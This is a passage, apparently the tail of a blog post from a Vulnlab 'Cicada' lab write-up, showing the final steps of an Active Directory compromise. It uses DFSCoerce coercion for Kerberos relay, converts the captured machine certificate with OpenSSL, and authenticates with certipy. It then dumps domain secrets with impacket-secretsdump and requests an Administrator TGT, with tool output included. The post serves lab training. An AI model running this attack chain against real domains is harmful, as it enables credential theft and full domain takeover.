+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dfscoerce.py -k -no-pass &#x27;dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA&#x27; dc-jpq225.cicada.vl</span><br></pre></td></tr></table></figure>
+
+<p>Output:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[-] Connecting to ncacn_np:dc-jpq225.cicada.vl[\PIPE\netdfs]</span><br><span class="line">[+] Successfully bound!</span><br><span class="line">[-] Sending NetrDfsRemoveStdRoot!</span><br><span class="line">NetrDfsRemoveStdRoot </span><br><span class="line">ServerName:                      &#x27;dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\x00&#x27; </span><br><span class="line">RootShare:                       &#x27;test\x00&#x27; </span><br><span class="line">ApiFlags:                        1 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DFSNM SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Cicada/getting-pfx.png" alt="Getting PFX certificate"></p>
+</li>
+<li><p>Process the certificate using OpenSSL:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -in &#x27;DC-JPQ225$.pfx&#x27; -nodes -nocerts -out key.pem -passin pass:</span><br><span class="line">openssl pkcs12 -in &#x27;DC-JPQ225$.pfx&#x27; -nodes -nokeys -out cert.pem -passin pass:</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Create a new PKCS12 file without password:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in cert.pem -inkey key.pem -out DC-JPQ225-nopass.pfx -passout pass:</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Use Certipy to authenticate with the certificate:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx &#x27;DC-JPQ225-nopass.pfx&#x27; -dc-ip 10.10.71.16 -domain cicada.vl</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Using principal: dc-jpq225$@cicada.vl</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;dc-jpq225.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;dc-jpq225$&#x27;</span><br><span class="line">[*] Got hash for &#x27;dc-jpq225$@cicada.vl&#x27;: aad3b435b51404eeaad3b435b51404ee:85a0da53871a----------</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Set up the Kerberos credential cache:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=dc-jpq225.ccache</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Extract all domain secrets:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass DC-JPQ225.cicada.vl</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a----------:::</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Finally, get a TGT for the Administrator:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT cicada.vl/Administrator -hashes :85a0da53871a---------- -dc-ip 10.10.71.16</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=4cc00787-bbf1-4974-a4bc-c40f0fb8521f">https://api.vulnlab.com/api/v1/share?id=4cc00787-bbf1-4974-a4bc-c40f0fb8521f</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx">https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writeups</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cicada-Domain-Compromise-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Cicada Domain Compromise Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Reconnaissance</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NFS-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">NFS Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Access-via-NFS"><span class="toc-number">1.3.</span> <span class="toc-text">Initial Access via NFS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Authentication-Attempts"><span class="toc-number">1.4.</span> <span class="toc-text">Authentication Attempts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Enumeration-with-BloodHound"><span class="toc-number">1.5.</span> <span class="toc-text">Domain Enumeration with BloodHound</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Certificate-Services-ADCS-Enumeration"><span class="toc-number">1.6.</span> <span class="toc-text">Active Directory Certificate Services (ADCS) Enumeration</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Machine-Account-Quota-Check"><span class="toc-number">1.7.</span> <span class="toc-text">Machine Account Quota Check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation-Path-1-Windows-VM-Approach"><span class="toc-number">1.8.</span> <span class="toc-text">Exploitation Path 1: Windows VM Approach</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Setting-Up-the-Windows-VM"><span class="toc-number">1.8.1.</span> <span class="toc-text">Setting Up the Windows VM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Building-and-Running-the-Exploit"><span class="toc-number">1.8.2.</span> <span class="toc-text">Building and Running the Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation-Path-2-Linux-Approach"><span class="toc-number">1.9.</span> <span class="toc-text">Exploitation Path 2: Linux Approach</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">1.10.</span> <span class="toc-text">References</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/03/30/VL-Cicada/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&text=VL-Cicada"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&title=VL-Cicada"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&is_video=false&description=VL-Cicada"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Cicada&body=Check out this article: https://panosoikogr.github.io/2025/03/30/VL-Cicada/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&title=VL-Cicada"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&title=VL-Cicada"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&title=VL-Cicada"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&title=VL-Cicada"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&name=VL-Cicada&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/03/30/VL-Cicada/&t=VL-Cicada"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
